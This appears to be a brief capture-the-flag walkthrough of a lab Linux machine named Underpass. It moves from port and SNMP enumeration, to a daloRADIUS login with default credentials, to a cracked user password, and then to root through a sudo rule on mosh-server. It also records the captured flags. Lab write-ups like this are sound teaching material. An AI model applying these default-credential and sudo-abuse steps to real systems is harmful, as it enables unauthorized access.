Underpass  - Easy Linux machine 
================================

nmap enumeration:
-----------------
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works

snmpbulk walk enumeration:
---------------------------
[Username] : steve@underpass.htb

--> UnDerPass.htb is the only daloradius server in the basin!
--> Nevada, U.S.A. but not Vegas

daloradius server - A free open source RADIUS (Remote Authentication Dial-In User Service) server.

underpass.htb is using the daloradius server. Since daloradius is a open source we can find the where login page located using the github.

https://github.com/lirantal/daloradius/blob/master/app/operators/login.php

http://underpass.htb/daloradius/app/operators/login.php --> login page 

default creds for daloradius:
[Username] : adminstrator 
[Password] : radius 

get one user inside the user list panel:
[Username] : svcMosh 
[HashPass] : 412DD4759978ACFCC81DEAB01B382403
[Password] : underwaterfriends 

ssh shell got with the above creds:

user.txt: 4447689b62e3fd8fbf4a1b81d3406790
==========================================

previlege escalation:
---------------------
$ sudo -l

Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

mosh-server --> server side for the mosh remote terminal application. default port between 60000 - 61000 


running mosh-server on the target --> sudo mosh-server new  ==> give the port 60001 and the MOSH_KEY=jLVaOnjZu25KLdeX04Z+gw

on my machine --> mosh-client ip port MOSH_KEY 

gives the root shell 

root.txt : 4b53ce32d4ec5b75358e4a63501723dc
============================================



